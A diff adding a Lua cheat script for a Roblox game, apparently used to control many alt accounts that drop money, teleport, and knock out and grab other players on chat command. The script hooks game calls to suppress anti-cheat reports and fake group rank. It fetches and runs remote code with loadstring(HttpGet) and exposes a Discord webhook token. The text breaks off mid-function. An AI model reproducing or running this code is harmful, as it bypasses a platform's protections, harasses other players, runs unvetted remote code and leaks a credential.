@@ -1,0 +1,813 @@
+getgenv().Settings = {
+    Host = 274127150,
+    Prefix = '/',
+    FPS = 2,
+    BlackScreen = true,
+    AdMessage = 'vouch eyedress 0995',
+    Webhook = 'https://discord.com/api/webhooks/1001879304881324044/srAiAQZEoSfF7PcjE_HNYSpC2jPPhuQy2I-1Oh-5-V4XIH2GTdrshHHITmjJWiVFkxQc',
+}
+
+getgenv().Alts = {
+    3954711285,
+   3954737528,
+   3954747132,
+    3954785782,
+     3954757934,
+    3956594839,
+  3956699233,
+  3956816184,
+ 3956898964,
+   3956913967,
+    3956993280,
+  3249377443,
+ 3249053117,
+ 3260565823,
+3249012319,
+3253250872,
+227473884,
+ 244300580,
+   3260216479,
+   3260222297,
+    243180620,
+     244324397,
+   244297630,
+268288582,
+215801603
+}
+
+if not game:IsLoaded() then
+	game.Loaded:Wait()
+end
+
+local player = game.Players.LocalPlayer
+local operator = false
+
+local function LOWGFX()
+    settings().Physics.PhysicsEnvironmentalThrottle = 1
+    settings().Rendering.QualityLevel = 'Level01'
+    UserSettings():GetService("UserGameSettings").MasterVolume = 0
+    for i,v in pairs(game:GetDescendants()) do
+        if v:IsA("Part") then
+            v.Material = Enum.Material.Pavement
+            v.Transparency = 1
+        elseif v:IsA("Decal") then
+            v:Destroy()
+        elseif v:IsA("Texture") then
+            v:Destroy()
+        elseif v:IsA("MeshPart") then
+            v.TextureID = 0
+            v.Transparency = 1
+        elseif v.Name == "Terrian" then
+            v.WaterReflectace = 1
+            v.WaterTransparency = 1
+        elseif v:IsA("SpotLight") then
+            v.Range = 0
+            v.Enabled = false
+        elseif v:IsA("WedgePart") then
+            v.Transparency = 1
+        elseif v:IsA("UnionOperation") then
+            v.Transparency = 1
+        end
+    end
+end
+
+local function formatnum(num)
+    return tostring(num):reverse():gsub("%d%d%d", "%1,"):reverse():gsub("^,", "")
+end
+
+game.Players.LocalPlayer.Idled:Connect(function()
+    game:GetService("VirtualUser"):Button2Down(Vector2.new(0,0),game.Workspace.CurrentCamera.CFrame)
+    wait(1)
+    game:GetService("VirtualUser"):Button2Up(Vector2.new(0,0),game.Workspace.CurrentCamera.CFrame)
+end)
+
+if player.UserId == Settings['Host'] then
+    operator = true
+    local decalsyeeted = true
+    local g = game
+    local w = g.Workspace
+    local l = g.Lighting
+    local t = w.Terrain
+    t.WaterWaveSize = 0
+    t.WaterWaveSpeed = 0
+    t.WaterReflectance = 0
+    t.WaterTransparency = 0
+    l.GlobalShadows = false
+    l.FogEnd = 9e9
+    l.Brightness = 0
+    settings().Rendering.QualityLevel = "Level01"
+    for i, v in pairs(g:GetDescendants()) do
+        if v:IsA("Part") or v:IsA("Union") or v:IsA("CornerWedgePart") or v:IsA("TrussPart") then
+            v.Material = "Plastic"
+            v.Reflectance = 0
+        elseif v:IsA("Decal") or v:IsA("Texture") and decalsyeeted then
+            v.Transparency = 1
+        elseif v:IsA("ParticleEmitter") or v:IsA("Trail") then
+            v.Lifetime = NumberRange.new(0)
+        elseif v:IsA("Explosion") then
+            v.BlastPressure = 1
+            v.BlastRadius = 1
+        elseif v:IsA("Fire") or v:IsA("SpotLight") or v:IsA("Smoke") or v:IsA("Sparkles") then
+            v.Enabled = false
+        elseif v:IsA("MeshPart") then
+            v.Material = "Plastic"
+            v.Reflectance = 0
+            v.TextureID = 10385902758728957
+        end
+    end
+    for i, e in pairs(l:GetChildren()) do
+        if e:IsA("BlurEffect") or e:IsA("SunRaysEffect") or e:IsA("ColorCorrectionEffect") or e:IsA("BloomEffect") or e:IsA("DepthOfFieldEffect") then
+            e.Enabled = false
+        end
+    end
+
+    hookfunction(game.Players.LocalPlayer.IsInGroup, function() return true end)
+    hookfunction(game.Players.LocalPlayer.GetRankInGroup, function() return true end)
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Crostide/Counter/main/Cash"))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Crostide/cdhc/main/gui"))()
+    game.CoreGui.Crostide_Recode.Frame.Frame.TextLabel.Text = "    JMAN's Selling GUI"
+    game.CoreGui.Crostide_Recode.Frame.CreditsFrame.TextLabel.Text = "eyedress#0995"
+
+    local plr = game.Players.LocalPlayer
+    local Mouse = plr:GetMouse()
+        
+    Mouse.KeyDown:Connect(function(a)
+        if a == "l" then
+            if game.CoreGui:FindFirstChild("Redware") then
+                game.CoreGui.Redware:Destroy()
+            end
+
+            Holder = Instance.new("ScreenGui")
+            Frame = Instance.new("Frame")
+            TextLabel = Instance.new("TextLabel")
+            TextLabel_2 = Instance.new("TextLabel")
+    		TextLabel_3 = Instance.new("TextLabel")
+    		
+            Holder.Name = "Redware"
+            Holder.Parent = game.CoreGui
+            Holder.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+            Holder.IgnoreGuiInset = true
+    
+            Frame.Parent = Holder
+            Frame.AnchorPoint = Vector2.new(0.5, 0.5)
+            Frame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
+            Frame.Position = UDim2.new(0.5, 0, 0.5, 0)
+            Frame.Size = UDim2.new(1, 0, 1, 0)
+    
+            TextLabel.Parent = Frame
+            TextLabel.AnchorPoint = Vector2.new(0.5, 0.5)
+            TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+            TextLabel.BackgroundTransparency = 1.000
+            TextLabel.Position = UDim2.new(0.5, 0, 0.49158523, 0)
+            TextLabel.Size = UDim2.new(0, 300, 0, 60)
+            TextLabel.Text = "eyedress#0995"
+            TextLabel.TextColor3 = Color3.fromRGB(144,238,144)
+            TextLabel.TextScaled = true
+            TextLabel.TextSize = 14.000
+            TextLabel.TextWrapped = true
+    
+            TextLabel_2.Parent = Frame
+            TextLabel_2.AnchorPoint = Vector2.new(0.5, 0.5)
+            TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+            TextLabel_2.BackgroundTransparency = 1.000
+            TextLabel_2.Position = UDim2.new(0.499739617, 0, 0.549961051, 0)
+            TextLabel_2.Size = UDim2.new(0, 180, 0, 40)
+            TextLabel_2.Text = game.Players.LocalPlayer.Name
+            TextLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
+            TextLabel_2.TextScaled = true
+            TextLabel_2.TextSize = 14.000
+            TextLabel_2.TextWrapped = true
+            
+			TextLabel_3.Parent = Frame
+            TextLabel_3.AnchorPoint = Vector2.new(0.5, 0.5)
+            TextLabel_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+            TextLabel_3.BackgroundTransparency = 1.000
+            TextLabel_3.Position = UDim2.new(0.499739617, 0, 0.599961051, 0)
+            TextLabel_3.Size = UDim2.new(0, 180, 0, 40)
+            TextLabel_3.Text = "MAIN"
+            TextLabel_3.TextColor3 = Color3.fromRGB(255, 0, 0)
+            TextLabel_3.TextScaled = true
+            TextLabel_3.TextSize = 14.000
+            TextLabel_3.TextWrapped = true
+            setfpscap(2)
+        elseif a == "k" then
+            setfpscap(60)
+            if game.CoreGui:FindFirstChild("Redware") then
+                game.CoreGui.Redware:Destroy()
+            end
+        end
+    end)
+    return
+end
+
+if Settings['BlackScreen'] == true then
+    Holder = Instance.new("ScreenGui")
+    Frame = Instance.new("Frame")
+    TextLabel = Instance.new("TextLabel")
+    TextLabel_2 = Instance.new("TextLabel")
+
+    Holder.Name = "Redware"
+    Holder.Parent = game.CoreGui
+    Holder.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+    Holder.IgnoreGuiInset = true
+
+    Frame.Parent = Holder
+    Frame.AnchorPoint = Vector2.new(0.5, 0.5)
+    Frame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
+    Frame.Position = UDim2.new(0.5, 0, 0.5, 0)
+    Frame.Size = UDim2.new(1, 0, 1, 0)
+
+    TextLabel.Parent = Frame
+    TextLabel.AnchorPoint = Vector2.new(0.5, 0.5)
+    TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+    TextLabel.BackgroundTransparency = 1.000
+    TextLabel.Position = UDim2.new(0.5, 0, 0.49158523, 0)
+    TextLabel.Size = UDim2.new(0, 300, 0, 60)
+    TextLabel.Text = "eyedress#0995"
+    TextLabel.TextColor3 = Color3.fromRGB(144,238,144)
+    TextLabel.TextScaled = true
+    TextLabel.TextSize = 14.000
+    TextLabel.TextWrapped = true
+
+    TextLabel_2.Parent = Frame
+    TextLabel_2.AnchorPoint = Vector2.new(0.5, 0.5)
+    TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+    TextLabel_2.BackgroundTransparency = 1.000
+    TextLabel_2.Position = UDim2.new(0.499739617, 0, 0.539961051, 0)
+    TextLabel_2.Size = UDim2.new(0, 140, 0, 40)
+    TextLabel_2.Text = game.Players.LocalPlayer.Name
+    TextLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
+    TextLabel_2.TextScaled = true
+    TextLabel_2.TextSize = 14.000
+    TextLabel_2.TextWrapped = true
+    pcall(function() setfpscap(Settings['FPS']) end)
+end
+
+local a=game:GetService("ReplicatedStorage").MainEvent;local b={"CHECKER_1","TeleportDetect","OneMoreTime"}local c;c=hookmetamethod(game,"__namecall",function(...)local d={...}local self=d[1]local e=getnamecallmethod()local f=getcallingscript()if e=="FireServer"and self==a and table.find(b,d[2])then return end return c(...)end)
+
+local LOCATIONS_CHACHE = {
+    OLD_HIDESPOT = nil,
+}
+
+local Toggles = {
+    Dropping = false,
+    Blocking = false,
+    CustomDropping = false,
+    KNOCKING = false,
+    DestroyCash = false,
+    Advertising = false,
+    Cashauraing = false,
+    Noclipping = false,
+    Airlock = false,
+    Ground = false,
+}
+
+game:GetService("RunService").Stepped:Connect(function()
+    if Toggles['Dropping'] == true then
+        game.ReplicatedStorage.MainEvent:FireServer("DropMoney",10000)
+    end
+    if Toggles['Blocking'] == true then
+        game.ReplicatedStorage.MainEvent:FireServer("Block",true)
+    end
+    if Toggles['DelCash'] == true then
+        for e, v in pairs(workspace:FindFirstChild('Ignored'):FindFirstChild('Drop'):GetChildren()) do
+            if v.Name == 'MoneyDrop' then
+                v:Destroy()
+            end
+        end
+    end
+    if Toggles['Cashauraing'] == true then
+        for i,v in pairs(workspace.Ignored.Drop:GetChildren()) do
+            if v:IsA("Part") and (v.Position-player.Character.HumanoidRootPart.Position).Magnitude <= 15 then
+                fireclickdetector(v:FindFirstChild("ClickDetector"))
+            end
+        end
+    end
+end)
+
+function Delcash(boolean)
+    Toggles['DelCash'] = boolean
+end
+
+local function CheckPlr(userId)
+    for i,v in pairs(game.Players:GetChildren()) do
+        if v.UserId == tonumber(userId) then
+            return true
+        end
+    end
+    return false
+end
+
+local function CheckPlr2(arg)
+    for i,v in pairs(game.Players:GetChildren()) do
+        if (string.sub(string.lower(v.Name),1,string.len(arg))) == string.lower(arg) then
+            return v.Name
+        end
+        if (string.sub(string.lower(v.DisplayName),1,string.len(arg))) == string.lower(arg) then
+            return v.Name
+        end
+    end
+    return nil
+end
+
+local function saymsg(msg)
+    game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg, 'All')
+end
+
+local function FormatAlts()
+    local new = {}
+    for i,v in pairs(Alts) do
+        if CheckPlr(v) == true then
+            table.insert(new,tonumber(v))
+        end
+    end
+    return new
+end
+
+local handSize
+local originFall
+coroutine.resume(coroutine.create(function()
+    repeat wait() until workspace.Players:FindFirstChild(player.Name)
+    handSize = player.Character:FindFirstChild("RightHand").Size
+    originFall = player.Character.Animate.fall.FallAnim.AnimationId
+end))
+
+local function reach(boolean)
+    if boolean == true then
+        for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
+            if string.find(v.Name,"Hand") then
+                pcall(function()
+                    v.Massless = true
+                    v.Size = Vector3.new(20,20,20)
+                    v.Transparency = .99
+                    v.CanCollide = true
+                end)
+            end
+        end
+    elseif boolean == false then
+        for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
+            if string.find(v.Name,"Hand") then
+                pcall(function()
+                    v.Massless = false
+                    v.Size = handSize
+                    v.Transparency = 0
+                    v.CanCollide = false
+                end)
+            end
+        end
+    end
+end
+
+local function KnockPlr(plr_name)
+    local data = CheckPlr2(plr_name)
+    if data == nil then
+        return false
+    end
+    local Target = game.Players[data]
+    if Target.Character and game.Players.LocalPlayer.Character and Target.Character.BodyEffects:FindFirstChild("Dead").Value == false and Target.Character.BodyEffects:FindFirstChild("K.O").Value == false then
+        local oldpos = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
+        repeat
+            pcall(function()
+                reach(true)
+                setfpscap(20)
+                local combat = game.Players.LocalPlayer.Character:FindFirstChild("Combat") or game.Players.LocalPlayer.Backpack:FindFirstChild("Combat")
+                if combat then
+                    if KNOCKING == false then
+                        reach(false)
+                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = oldpos
+                        return false
+                    end
+                    if game.Players.LocalPlayer.Backpack:FindFirstChild("Combat") then
+                        game.Players.LocalPlayer.Backpack:FindFirstChild("Combat").Parent = game.Players.LocalPlayer.Character
+                    end
+                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Target.Character.HumanoidRootPart.CFrame + Vector3.new(0,5,0)
+                    game.Players.LocalPlayer.Character:FindFirstChild("Combat"):Activate()
+                end
+            end)
+            wait(0.01)
+        until Target.Character.BodyEffects:FindFirstChild("K.O").Value == true
+        reach(false)
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = oldpos
+        return Target.Name
+    end
+    return false
+end
+
+local locations_setup = {
+    Bank = {"-388,21,-336","-388,21,-327","-388,21,-318","-388,21,-309","-388,21,-300","-388,21,-291","-388,21,-282","-388,21,-273","-388,21,-264","-388,21,-255","-388,21,-246","-388,21,-237","-388,21,-228","-375,21,-336","-375,21,-327","-375,21,-318","-375,21,-309","-375,21,-300","-375,21,-291","-375,21,-282","-375,21,-273","-375,21,-264","-375,21,-255","-375,21,-246","-375,21,-237","-375,21,-228","-360,21,-336","-360,21,-327","-360,21,-318","-360,21,-309","-360,21,-300","-360,21,-291","-360,21,-282","-360,21,-273","-360,21,-264","-360,21,-255","-360,21,-246","-360,21,-237","-360,21,-228"},
+    Club = {"-282,-7,-348","-274,-7,-348","-266,-7,-348","-258,-7,-348","-250,-7,-348","-282,-7,-357","-274,-7,-357","-266,-7,-357","-258,-7,-357","-250,-7,-357","-282,-7,-362","-274,-7,-362","-266,-7,-362","-258,-7,-362","-250,-7,-362","-282,-7,-367","-274,-7,-367","-266,-7,-367","-258,-7,-367","-250,-7,-367","-282,-7,-372","-274,-7,-372","-266,-7,-372","-258,-7,-372","-250,-7,-372","-282,-7,-377","-274,-7,-377","-266,-7,-377","-258,-7,-377","-250,-7,-377","-282,-7,-382","-274,-7,-382","-266,-7,-382","-258,-7,-382","-250,-7,-382","-248,0,-342","-260,0,-341","-271,0,-341","-281,0,-341"},
+    Train = {"553,35,-56","553,35,-66","553,35,-76","553,35,-86","553,35,-96","553,35,-106","568,35,-56","568,35,-66","568,35,-76","568,35,-86","568,35,-96","568,35,-106","688,35,-141","679,35,-141","670,35,-141","661,35,-141","652,35,-141","643,35,-141","634,35,-141","625,35,-141","616,35,-141","607,35,-141","688,35,-156","679,35,-156","670,35,-156","661,35,-156","652,35,-156","643,35,-156","634,35,-156","625,35,-156","616,35,-156","607,35,-156","586,34,-142","579,34,-135","566,34,-122","572,34,-115","583,34,-127","593,34,-138"},
+    Admin = {"-826,-40,-617","-826,-40,-605","-826,-40,-593","-826,-40,-581","-826,-40,-569","-826,-40,-557","-845,-40,-617","-845,-40,-605","-845,-40,-593","-845,-40,-581","-845,-40,-569","-845,-40,-557","-864,-40,-617","-864,-40,-605","-864,-40,-593","-864,-40,-581","-864,-40,-569","-864,-40,-557","-879,-40,-617","-879,-40,-605","-879,-40,-593","-879,-40,-581","-879,-40,-569","-879,-40,-557","-898,-40,-617","-898,-40,-605","-898,-40,-593","-898,-40,-581","-898,-40,-569","-898,-40,-557","-918,-40,-617","-918,-40,-605","-918,-40,-593","-918,-40,-581","-918,-40,-569","-918,-40,-557","-816,-33,-643","-927,-33,-642","-873,-33,-521"}
+}
+
+local TPAREAS = {
+    Admin = "-870.7142944335938, -32.64921188354492, -654.3141479492188",
+    Bank = "-375.7147216796875, 21.24999237060547, -364.8031311035156",
+    Club = "-265.0559387207031, 0.02806040644645691, -429.0494384765625",
+    Train = "608.0512084960938, 47.9999885559082, -104.57772064208984"
+}
+
+local function SetupArea(area)
+    local cords = locations_setup[area]
+    local newalts = FormatAlts()
+    local index = 0
+    for i,v in pairs(newalts) do
+        if v == player.UserId then
+            index = index + 1
+            local x,y,z = string.split(cords[index],",")[1],string.split(cords[index],",")[2],string.split(cords[index],",")[3]
+            player.Character.HumanoidRootPart.CFrame = CFrame.new(x,y,z)
+        else
+            index = index + 1
+        end
+    end
+end
+
+local PresentSetups = {
+    SurroundSetup = {"4.5,0,0","0,0,4.5","-4.5,0,0","0,0,-4.5","3,0,3","-3,0,3","-3,0,-3","3,0,-3","6.5,0,0","5,0,3","3.5,0,5","0,0,6.5","-5,0,3","-3.5,0,5","-6.5,0,0","-5,0,-3","-3.5,0,-5","0,0,-6.5","5,0,-3","3.5,0,-5","4.5,7,0","0,7,4.5","-4.5,7,0","0,7,-4.5","3,7,3","-3,7,3","-3,7,-3","3,7,-3","6.5,7,0","5,7,3","3.5,7,5","0,7,6.5","-5,7,3","-3.5,7,5","-6.5,7,0","-5,7,-3","-3.5,7,-5","0,7,-6.5","5,7,-3","3.5,7,-5"},
+}
+
+local function Surronund(PLRNAME)
+    local data = CheckPlr2(PLRNAME)
+    if data then
+        local newalts = FormatAlts()
+        local index = 0
+        local Target = game.Players[data]
+        for i,v in pairs(newalts) do
+            if v == player.UserId then
+                index = index + 1
+                local cords = PresentSetups['SurroundSetup'][index]
+                local x,y,z = string.split(cords,",")[1],string.split(cords,",")[2],string.split(cords,",")[3]
+                player.Character.HumanoidRootPart.CFrame = CFrame.new(Target.Character.HumanoidRootPart.CFrame.X+tonumber(x),Target.Character.HumanoidRootPart.CFrame.Y+tonumber(y),Target.Character.HumanoidRootPart.CFrame.Z+tonumber(z))
+            else
+                index = index + 1
+            end
+        end
+    else
+        return false
+    end
+end
+
+local function CreateGroundPart()
+    local Name = "GROUND"
+    local Part = Instance.new("Part",workspace)
+    Part.Name = Name
+    Part.Size = Vector3.new(60,2,60)
+    Part.Transparency = 1
+    return Name
+end
+
+game:GetService("RunService").Stepped:Connect(function()
+    if Toggles['Noclipping'] == true then
+        for i,v in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
+            if v:IsA("BasePart") and v.CanCollide == true then
+                v.CanCollide = false
+            end
+        end
+    end
+end)
+
+function Reset()
+    for i,v in pairs(player.Character:GetChildren()) do
+        if string.find(v.Name,"Humanoid") or v:IsA("MeshPart") then
+            v:Destroy()
+        end
+    end
+end
+
+function Drop(boolean)
+    if boolean == true then
+        Toggles['Dropping'] = true
+        Toggles['Blocking'] = true
+    elseif boolean == false then
+        Toggles['Dropping'] = false
+        Toggles['Blocking'] = false
+        Toggles['KNOCKING'] = false
+        Toggles['Cashauraing'] = false
+        Toggles['CustomDropping'] = false
+        wait(0.5)
+        for i=1,10 do
+            wait()
+            game.ReplicatedStorage.MainEvent:FireServer("Block",false)
+        end
+    end
+end
+
+function Wallet(boolean)
+    if boolean == true then
+        if game.Players.LocalPlayer.Backpack:FindFirstChild("Wallet") then
+            game.Players.LocalPlayer.Backpack:FindFirstChild("Wallet").Parent = game.Players.LocalPlayer.Character
+        end
+    elseif boolean == false then
+        if game.Players.LocalPlayer.Character:FindFirstChild("Wallet") then
+            game.Players.LocalPlayer.Character:FindFirstChild("Wallet").Parent = game.Players.LocalPlayer.Backpack
+        end
+    end
+end
+
+function Airlock(boolean)
+    if boolean == true then
+        if workspace:FindFirstChild("AirlockPart") then
+            workspace:FindFirstChild("AirlockPart"):Destroy()
+        end
+        if workspace:FindFirstChild("GROUND") then
+            workspace:FindFirstChild("GROUND"):Destroy()
+        end
+        Freeze(false)
+        Toggles['Airlock'] = true
+        local cf = 7
+        if Toggles['Ground'] == true then
+            cf = 14
+        end
+        local plr = game:service"Players".LocalPlayer
+        local Part = Instance.new("Part",workspace)
+        player.Character.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=3541114300"
+        Part.Name = "AirlockPart"
+        Part.Size = Vector3.new(4,1.2,4)
+        Part.Transparency = 1
+        Part.CFrame = player.Character.HumanoidRootPart.CFrame+Vector3.new(0,cf,0)
+        Part.Anchored = true
+        player.Character.HumanoidRootPart.CFrame = Part.CFrame+Vector3.new(0,2.5,0)
+        wait(0.25)
+        Freeze(true)
+        wait(.5)
+        Part:Destroy()
+    elseif boolean == false then
+        if workspace:FindFirstChild("AirlockPart") then
+            workspace:FindFirstChild("AirlockPart"):Destroy()
+        end
+        Toggles['Airlock'] = false
+        player.Character.HumanoidRootPart.Anchored = false
+        wait(4)
+        player.Character.HumanoidRootPart.Anchored = true
+    end
+end
+
+function Ground(boolean)
+    if boolean == true then
+        if workspace:FindFirstChild("GROUND") then
+            workspace:FindFirstChild("GROUND"):Destroy()
+        end
+        if workspace:FindFirstChild("AirlockPart") then
+            workspace:FindFirstChild("AirlockPart"):Destroy()
+        end
+        Toggles['Ground'] = true
+        Freeze(false)
+        Toggles['Noclipping'] = true
+        local cf = 5
+        if Toggles['Airlock'] == true then
+            cf = 15
+        end
+        local part = CreateGroundPart()
+        workspace:FindFirstChild(part).CFrame = player.Character.HumanoidRootPart.CFrame-Vector3.new(0,14,0)
+        workspace:FindFirstChild(part).Anchored = true
+        player.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame-Vector3.new(0,cf,0)
+        wait(1)
+        Freeze(true)
+        if workspace:FindFirstChild("GROUND") then
+            workspace:FindFirstChild("GROUND"):Destroy()
+        end
+    elseif boolean == false then
+        Toggles['Ground'] = false
+        if workspace:FindFirstChild("GROUND") then
+            workspace:FindFirstChild("GROUND"):Destroy()
+        end
+        Toggles['Noclipping'] = false
+        Freeze(false)
+        player.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame + Vector3.new(0,8,0)
+        wait(1)
+        Freeze(true)
+    end
+end
+
+function Freeze(boolean)
+    if boolean == true then
+        player.Character.HumanoidRootPart.Anchored = true
+    elseif boolean == false then
+        player.Character.HumanoidRootPart.Anchored = false
+    end
+end
+
+function Stop()
+    Toggles[''] = false
+    Toggles['Noclipping'] = false
+    Toggles['Airlock'] = false
+    Toggles['Drop'] = false
+    Toggles['Ground'] = false
+    Toggles['Dropping'] = false
+    Toggles['Blocking'] = false
+    Toggles['KNOCKING'] = false
+    Toggles['Cashauraing'] = false
+end
+
+local function cmds(msg,plr)
+    if operator == false or plr == Settings['Host'] then
+        local op = game.Players:GetPlayerByUserId(plr)
+        if not operator then
+            if string.lower(msg) == Settings['Prefix'].."warp" then
+                Freeze(false)
+                Stop()
+                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = op.Character.HumanoidRootPart.CFrame+op.Character.HumanoidRootPart.CFrame.lookVector*3.5
+                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame*CFrame.Angles(0, math.rad(180), 0)
+            elseif string.lower(msg) == Settings['Prefix'].."hide" then
+                Freeze(false)
+                LOCATIONS_CHACHE['OLD_HIDESPOT'] = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
+                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-163,54,216)
+                wait(2)
+                Freeze(true)
+            elseif string.lower(msg) == Settings['Prefix'].."unhide" then
+                Freeze(false)
+                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = LOCATIONS_CHACHE['OLD_HIDESPOT']
+                wait(2)
+                Freeze(true)
+            elseif string.lower(msg) == Settings['Prefix'].."reset" then
+                Reset()
+            elseif string.lower(msg) == Settings['Prefix'].."god" then
+                if game.Players.LocalPlayer.Character:FindFirstChild("BodyEffects").Attacking then
+                    game.Players.LocalPlayer.Character:FindFirstChild("BodyEffects").Attacking:Destroy()
+                    saymsg("[god]")
+                end
+            elseif string.lower(msg) == Settings['Prefix'].."drop" then
+                Drop(true)
+            elseif string.lower(msg) == Settings['Prefix'].."stop" then
+                Drop(false)
+            elseif string.lower(msg) == Settings['Prefix'].."ground" then
+                Ground(true)
+            elseif string.lower(msg) == Settings['Prefix'].."airlock" then
+                Airlock(true)
+            elseif string.lower(msg) == Settings['Prefix'].."unlock" then
+                if Toggles['Airlock'] == true then
+                    Airlock(false)
+                elseif Toggles['Ground'] == true then
+                    Ground(false)
+                end
+            end
+            msg = string.split(msg," ")
+            msg[1] = string.lower(msg[1])
+            if msg[1] == Settings['Prefix'].."setup" then
+                Stop()
+                Freeze(false)
+                if string.lower(msg[2]) == "admin" then
+                    Freeze(false)
+                    SetupArea("Admin")
+                    wait(2)
+                    Freeze(true)
+                elseif string.lower(msg[2]) == "train" then
+                    Freeze(false)
+                    SetupArea("Train")
+                    wait(2)
+                    Freeze(true)
+                elseif string.lower(msg[2]) == "club" then
+                    Freeze(false)
+                    SetupArea("Club")
+                    wait(2)
+                    Freeze(true)
+                elseif string.lower(msg[2]) == "bank" then
+                    Freeze(false)
+                    SetupArea("Bank")
+                    wait(2)
+                    Freeze(true)
+                end
+            elseif msg[1] == Settings['Prefix'].."delcash" then
+                if string.lower(msg[2]) == "on" then
+                    Delcash(true)
+                    saymsg("[on]")
+                elseif string.lower(msg[2]) == "off" then
+                    DelCash(false)
+                    saymsg("[off]")
+                end
+            elseif msg[1] == Settings['Prefix'].."money" then
+                if string.lower(msg[2]) == "show" then
+                    Wallet(false)
+                    saymsg("[on]")
+                elseif string.lower(msg[2]) == "hide" then
+                    Wallet(true)
+                    saymsg("[off]")
+                end
+            elseif msg[1] == Settings['Prefix'].."bring" then
+                if player.UserId == Alts[1] then
+                    player.Character.HumanoidRootPart.Anchored = false
+                    local theplace = ""
+                    if msg[3] == nil or string.lower(msg[3]) == "host" then
+                        theplace = "HOST"
+                    elseif string.lower(msg[3]) == nil then
+                        theplace = "HOST"
+                    elseif string.lower(msg[3]) == "admin" then
+                        theplace = "Admin"
+                    elseif string.lower(msg[3]) == "train" then
+                        theplace = "Train"
+                    elseif string.lower(msg[3]) == "club" then
+                        theplace = "Club"
+                    elseif string.lower(msg[3]) == "bank" then
+                        theplace = "Bank"
+                    end
+                    if theplace then
+                        local ko_data = KnockPlr(msg[2])
+                        if ko_data then
+                            local Target = game.Players[ko_data]
+                            local oldpos = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
+                            if Target.Character and game.Players.LocalPlayer.Character and Target.Character.BodyEffects:FindFirstChild("Dead").Value == false and Target.Character.BodyEffects:FindFirstChild("K.O").Value == true then
+                                repeat
+                                    pcall(function()
+                                        if not Target.Character:FindFirstChild("GRABBING_CONSTRAINT") then
+                                            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Target.Character.UpperTorso.Position.X,Target.Character.UpperTorso.Position.Y-1.3,Target.Character.UpperTorso.Position.Z)
+                                            game.ReplicatedStorage.MainEvent:FireServer("Grabbing",false)
+                                        end
+                                    end)
+                                    wait(.5)
+                                until Target.Character:FindFirstChild("GRABBING_CONSTRAINT")
+                                if theplace == "Admin" then
+                                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(string.split(TPAREAS['Admin'],",")[1],string.split(TPAREAS['Admin'],",")[2],string.split(TPAREAS['Admin'],",")[3])
+                                elseif theplace == "Train" then
+                                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(string.split(TPAREAS['Train'],",")[1],string.split(TPAREAS['Train'],",")[2],string.split(TPAREAS['Train'],",")[3])
+                                elseif theplace == "Club" then
+                                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(string.split(TPAREAS['Club'],",")[1],string.split(TPAREAS['Club'],",")[2],string.split(TPAREAS['Club'],",")[3])
+                                elseif theplace == "Bank" then
+                                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(string.split(TPAREAS['Bank'],",")[1],string.split(TPAREAS['Bank'],",")[2],string.split(TPAREAS['Bank'],",")[3])
+                                elseif theplace == "HOST" then
+                                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = op.Character.HumanoidRootPart.CFrame+op.Character.HumanoidRootPart.CFrame.lookVector*3.5
+                                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame*CFrame.Angles(0, math.rad(180), 0)
+                                end
+                                wait(1)
+                                repeat
+                                    if not Target.Character:FindFirstChild("GRABBING_CONSTRAINT") then
+                                        wait(1)
+                                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = oldpos
+                                        return
+                                    end
+                                    pcall(function()
+                                        game.ReplicatedStorage.MainEvent:FireServer("Grabbing",false)
+                                    end)
+                                    wait(0.01) 
+                                until not Target.Character:FindFirstChild("GRABBING_CONSTRAINT")
+                                wait(1)
+                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = oldpos
+                                wait(2)
+                                Freeze(true)
+                                setfpscap(Settings['FPS'])
+                            end
+                        end
+                    end
+                end
+            elseif msg[1] == Settings['Prefix'].."to" then
+                Stop()
+                Freeze(false)
+                Surronund(msg[2])
+                wait(2)
+                Freeze(true)
+            elseif msg[1] == Settings['Prefix'].."dupe" then
+                Freeze(false)
+                local DATANAME = CheckPlr2(msg[2])
+                if DATANAME then
+                    if DATANAME ~= player.Name then
+                        local newalts = FormatAlts()
+                        local cords = PresentSetups['SurroundSetup']
+                        local index = 0
+                        local Target = game.Players[DATANAME]
+                        for i,v in pairs(newalts) do
